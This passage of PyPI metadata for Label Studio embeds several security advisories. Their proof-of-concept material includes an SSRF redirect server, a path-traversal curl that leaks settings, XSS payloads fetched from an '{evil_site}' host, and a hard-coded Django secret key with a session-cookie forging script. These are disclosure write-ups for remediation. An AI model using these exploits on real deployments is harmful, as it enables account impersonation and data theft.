tool","version":"1.3","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"44c322d053e0e98a1b53eb41c15ff2cabb8393f5b51e60b42ccceeaa4f1da898","md5":"7faf47bd22a0458dec972ce0f8e6844c","sha256":"e80fb4719aa92467c13ab656ecb431a3e5fdabd65652bf6896392d30994693f2"},"downloads":-1,"filename":"label_studio-1.3-py3-none-any.whl","has_sig":false,"md5_digest":"7faf47bd22a0458dec972ce0f8e6844c","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":48312855,"upload_time":"2021-09-17T18:13:08","upload_time_iso_8601":"2021-09-17T18:13:08.726488Z","url":"https://files.pythonhosted.org/packages/44/c3/22d053e0e98a1b53eb41c15ff2cabb8393f5b51e60b42ccceeaa4f1da898/label_studio-1.3-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"8bace4845d72f32ee659fce7b264142f6be51dbd69a9f574798f2ca5aff5be5c","md5":"16df1524a7fd738fa7d5b0b77a3f14cd","sha256":"c68e58e8b98a76f2fb1ce90134f27d8feffbd0289d8450284f1ab1d5a56d76d0"},"downloads":-1,"filename":"label-studio-1.3.tar.gz","has_sig":false,"md5_digest":"16df1524a7fd738fa7d5b0b77a3f14cd","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":47252204,"upload_time":"2021-09-17T18:13:19","upload_time_iso_8601":"2021-09-17T18:13:19.924594Z","url":"https://files.pythonhosted.org/packages/8b/ac/e4845d72f32ee659fce7b264142f6be51dbd69a9f574798f2ca5aff5be5c/label-studio-1.3.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            